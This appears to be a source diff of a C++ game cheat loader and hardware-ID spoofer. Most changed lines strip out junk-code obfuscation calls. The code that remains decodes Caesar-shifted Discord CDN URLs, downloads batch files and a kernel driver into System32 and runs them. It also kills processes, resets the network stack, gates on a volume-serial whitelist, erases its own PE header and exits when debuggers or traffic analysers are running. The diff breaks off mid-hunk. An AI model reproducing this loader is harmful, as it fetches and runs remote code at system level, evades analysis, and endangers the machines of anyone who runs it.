@@ -114,17 +114,6 @@ void startup();
 
 void SizeOfImage()
 {
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
     // Any unreasonably large value will work say for example 0x100000 or 100,000h
     __asm
     {
@@ -139,23 +128,6 @@ void SizeOfImage()
 
 void apex()
 {
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
     std::string apex = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114575800954941/dsha.edw");
     std::string apexpath = (dead("C:\\Windows\\System32\\1028\\Apex.bat").c_str());
     URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
@@ -166,22 +138,6 @@ void apex()
 }
 void gta()
 {
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-
-
     std::string gta = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114574483918858/jwd.edw");
     std::string gtapath = (dead("C:\\Windows\\System32\\gta.bat").c_str());
     URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
@@ -191,22 +147,6 @@ void gta()
 }
 void fortnite()
 {
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-
-
     std::string fortnite = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114573007527946/Fruwqlwh.edw");
     std::string fortnitepath = (dead("C:\\Windows\\System32\\1040\\Fortnite.bat").c_str());
     URLDownloadToFileA(NULL, fortnite.c_str(), fortnitepath.c_str(), 0, NULL);
@@ -215,21 +155,6 @@ void fortnite()
 }
 void fishingplanet()
 {
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-
     std::string fishingplanet = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114571648593931/ilvklqj-sodqhw.edw");
     std::string fishingplanetpath = (dead("C:\\Windows\\System32\\2052\\Fishing-planet.bat").c_str());
     URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
@@ -239,21 +164,6 @@ void fishingplanet()
 }
 void cod()
 {
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-
     std::string cod = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114570369318962/Crog-Wduh.edw");
     std::string codpath = (dead("C:\\Windows\\System32\\3082\\Cold-Ware.bat").c_str());
     URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
@@ -265,21 +175,6 @@ void cod()
 
 
 void cleaner() {
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-
     system(dead("taskkill /F /IM CCleaner64.exe 2>NULL").c_str());
     system(dead("taskkill /F /IM WargamingErrorMonitor.exe 2>NULL").c_str());
     system(dead("taskkill /F /IM wargamingerrormonitor.exe 2>NULL").c_str());
@@ -388,25 +283,9 @@ void cleaner() {
 }
 void deleter()
 {
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-
-
     //delete the files we downloaded
     system(dead("cd C:\\Windows\\SysWOW64\\").c_str());
-    
+
     system(dead("del audio-for-stability.exe").c_str());
 
     system(dead("cls").c_str());
@@ -457,23 +336,8 @@ void deleter()
 
 void safeshutdown()
 {
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-
     system(dead("cls").c_str());
-    
+
     string a;
     std::cout << RED << (dead("\nunloading kernel modules").c_str());
     Sleep(3500);
@@ -500,21 +364,6 @@ void safeshutdown()
 }
 void driverdetect()
 {
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-
     const TCHAR* devices[] = {
 _T("\\\\.\\Dumper"),
 _T("\\\\.\\KsDumper")
@@ -539,24 +388,6 @@ _T("\\\\.\\KsDumper")
 
 void spoofer()
 {
-    rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-
-
-
-
     string spoofer = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/881227464498630677/NhzWrri.vbv");
     string spooferpath = (dead("C:\\Windows\\System32\\de-DE\\woof.sys").c_str());
     URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);
@@ -569,9 +400,6 @@ void spoofer()
     Sleep(2000);
     deleter();
     Sleep(2000);
-    rydekem();
-    lnttirs();
-    tlmisir();
     system(dead("NETSH WINSOCK RESET").c_str());
     system(dead("NETSH INT IP RESET").c_str());
     system(dead("NETSH INTERFACE IPV4 RESET").c_str());
@@ -611,27 +439,8 @@ vector<string> serial;
 
 void loadserial()
 {
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-
-
     serial.push_back(dead("384604182").c_str());
     serial.push_back(dead("2953439145").c_str());
-    rydekem();
-    lnttirs();
-    tlmisir();
 
 }
 auto RandomTitle = [](int iterations) {
@@ -658,20 +467,7 @@ void mainbot()
         LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
 
     }
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
+
 
 
 
@@ -682,20 +478,7 @@ void mainbot()
     DWORD fileSystemFlags = 0;
 
 
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
+
 
     __asm
     {
@@ -738,47 +521,14 @@ void mainbot()
     if (GetVolumeInformation(_T("C:\\"), volumeName, ARRAYSIZE(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, ARRAYSIZE(fileSystemName)));
     while (true)
     {
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            rydekem();
-        lnttirs();
-        tlmisir();
-
-        rydekem();
-        lnttirs();
-        tlmisir();
         if (find(serial.begin(), serial.end(), to_string(serialNumber)) != serial.end())
         {
-            rydekem();
-            lnttirs();
-            tlmisir();
 
-            rydekem();
-            lnttirs();
-            tlmisir();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                rydekem();
-            lnttirs();
-            tlmisir();
-
-            rydekem();
-            lnttirs();
-            tlmisir();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-            
+
             SetConsoleTitleA(RandomTitle(rand() % 90 + 20).c_str());
             setcolor(9);
             std::cout << (dead(" _| |___ _____ ___ ___   ------------------ \n").c_str());
@@ -793,17 +543,6 @@ void mainbot()
             std::cout << RED << (dead("\n\nloading in sockets...").c_str());
             Sleep(2400);
             system(dead("cls").c_str());
-            rydekem();
-            lnttirs();
-            tlmisir();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                rydekem();
-            lnttirs();
-            tlmisir();
 
             cleaner();
             fishingplanet();
@@ -812,58 +551,25 @@ void mainbot()
             cod();
             fortnite();
             spoofer();
-            rydekem();
-            lnttirs();
-            tlmisir(); 
-            lnttirs();
-            tlmisir();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                rydekem();
-            lnttirs();
-            tlmisir();
+
 
         }
 
         else
         {
-            rydekem();
-            lnttirs();
-            tlmisir();
-            rydekem();
-            lnttirs();
-            tlmisir();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                rydekem();
-            lnttirs();
-            tlmisir();
+
+
 
             system(dead("cls").c_str());
             std::cout << CYAN << (dead("Sorry but you are not in our database. ").c_str()) << std::endl;
             std::cout << GREEN << (dead("Hwid : ").c_str());;
             std::cout << serialNumber << std::endl;
             Sleep(10000);
-            rydekem();
-            lnttirs();
-            tlmisir();
             JUNK_CODE_ONE
                 JUNK_CODE_ONE
                 JUNK_CODE_ONE
                 JUNK_CODE_ONE
                 JUNK_CODE_ONE
-                rydekem();
-            lnttirs();
-            tlmisir();
-            rydekem();
-            lnttirs();
-            tlmisir();
             exit(0);
 
         }
@@ -915,17 +621,7 @@ void otherthing()
 }
 void HideFromDebugger()
 {
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
+
     OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
         TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
         TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -968,31 +664,8 @@ void startup();
 int _start()
 {
     trampoline;
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
     HideThread;
     startup();
-
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
     trampoline;
 }
 
@@ -1000,83 +673,17 @@ void startup()
 {
     ErasePEHeaderFromMemory();
     trampoline;
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
     trampoline;
-
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    
-
-
-    
-
-
-  
-
-
-
-
 
     if (GetLastError != 0)
     {
 
-       
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-      
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         HideFromDebugger();
         driverdetect();
         build_date();
         build_time();
         loadserial();
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
         mainbot();
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            rydekem();
-        lnttirs();
-        tlmisir();
-
     }
 
 
@@ -1085,333 +692,7 @@ void startup()
 
 int main()
 {
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
     if (IsProcessRunning(dead(L"ida.exe").c_str()))
-    {
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
-        SetLastError(1);
-        exit(0);
-    }
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    if (IsProcessRunning(dead(L"ProcessHacker.exe").c_str()))
-    {
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Process Hacker detected && ECHO Process Hacker detected. && TIMEOUT 10 >nul").c_str());
-        SetLastError(1);
-        exit(0);
-    }
-
-    if (IsProcessRunning(dead(L"Fiddler.exe").c_str()))
-    {
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Fiddler detected && ECHO Fiddler detected. && TIMEOUT 10 >nul").c_str());
-        SetLastError(1);
-        exit(0);
-    }
-    if (IsProcessRunning(dead(L"Wireshark.exe").c_str()))
-    {
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Wireshark detected && ECHO Wireshark detected. && TIMEOUT 10 >nul").c_str());
-        SetLastError(1);
-        exit(0);
-    }
-    if (IsProcessRunning(dead(L"PETools.exe").c_str()))
-    {
-        trampoline;
-
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE PE Tools detected && ECHO PE Tools detected. && TIMEOUT 10 >nul").c_str());
-        SetLastError(1);
-        exit(0);
-    }
-    if (IsProcessRunning(dead(L"procexp.exe").c_str()))
-    {
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Process Explorer detected && ECHO Process Explorer detected. && TIMEOUT 10 >nul").c_str());
-        SetLastError(1);
-        exit(0);
-    }
-    if (IsProcessRunning(dead(L"ImmunityDebugger.exe").c_str()))
-    {
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Immunity Debugger detected && ECHO Immunity Debugger detected. && TIMEOUT 10 >nul").c_str());
-        SetLastError(1);
-        exit(0);
-    }
-    if (IsProcessRunning(dead(L"ida64.exe").c_str()))
-    {
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
-        SetLastError(1);
-        exit(0);
-    }
-    if (IsProcessRunning(dead(L"windbg.exe").c_str()))
-    {
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE WINDBG detected && ECHO WINDBG detected. && TIMEOUT 10 >nul").c_str());
-        SetLastError(1);
-        exit(0);
-    }
-    if (IsProcessRunning(dead(L"httpdebugger.exe").c_str()))
-    {
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE HTTP DEBUGGER detected && ECHO HTTP DEBUGGER detected. && TIMEOUT 10 >nul").c_str());
-        SetLastError(1);
-        exit(0);
-    }
-    if (IsProcessRunning(dead(L"x32dbg.exe").c_str()))
-    {
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE x32dbg detected && ECHO x32dbg detected. && TIMEOUT 10 >nul").c_str());
-        SetLastError(1);
-        exit(0);
-    }
-    if (IsProcessRunning(dead(L"x64dbg.exe").c_str()))
-    {
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE x64dbg detected && ECHO x64dbg detected. && TIMEOUT 10 >nul").c_str());
-        SetLastError(1);
-        exit(0);
-    }
-    if (IsProcessRunning(dead(L"idaq.exe").c_str()))
-    {
-        
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
-        SetLastError(1);
-        exit(0);
-    }
-    if (IsProcessRunning(dead(L"idaq64.exe").c_str()))
-    {
-
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
-        SetLastError(1);
-        exit(0);
-    }
-    if (IsProcessRunning(dead(L"ollydbg.exe").c_str()))
-    {
-
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE OllyDBG detected && ECHO OllyDBG detected. && TIMEOUT 10 >nul").c_str());
-        SetLastError(1);
-        exit(0);
-    }
-  
-    if (GetLastError == 0)
-    {
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-        trampoline;
-        _start();
-        trampoline;
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-
-        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")); 
-    }
-    else
     {
         trampoline;
         rydekem();
@@ -1425,6 +706,119 @@ int main()
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+    if (IsProcessRunning(dead(L"ProcessHacker.exe").c_str()))
+    {
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Process Hacker detected && ECHO Process Hacker detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+
+    if (IsProcessRunning(dead(L"Fiddler.exe").c_str()))
+    {
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Fiddler detected && ECHO Fiddler detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+    if (IsProcessRunning(dead(L"Wireshark.exe").c_str()))
+    {
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Wireshark detected && ECHO Wireshark detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+    if (IsProcessRunning(dead(L"PETools.exe").c_str()))
+    {
+        trampoline;
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE PE Tools detected && ECHO PE Tools detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+    if (IsProcessRunning(dead(L"procexp.exe").c_str()))
+    {
+        trampoline;
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Process Explorer detected && ECHO Process Explorer detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+    if (IsProcessRunning(dead(L"ImmunityDebugger.exe").c_str()))
+    {
+        trampoline;
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE Immunity Debugger detected && ECHO Immunity Debugger detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+    if (IsProcessRunning(dead(L"ida64.exe").c_str()))
+    {
+        trampoline;
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+    if (IsProcessRunning(dead(L"windbg.exe").c_str()))
+    {
+        trampoline;
+        system(dead("start cmd /c START CMD /C \"COLOR 6 && TITLE WINDBG detected && ECHO WINDBG detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+    }
+    if (IsProcessRunning(dead(L"httpdebugger.exe").c_str()))
+    {
+        trampoline;
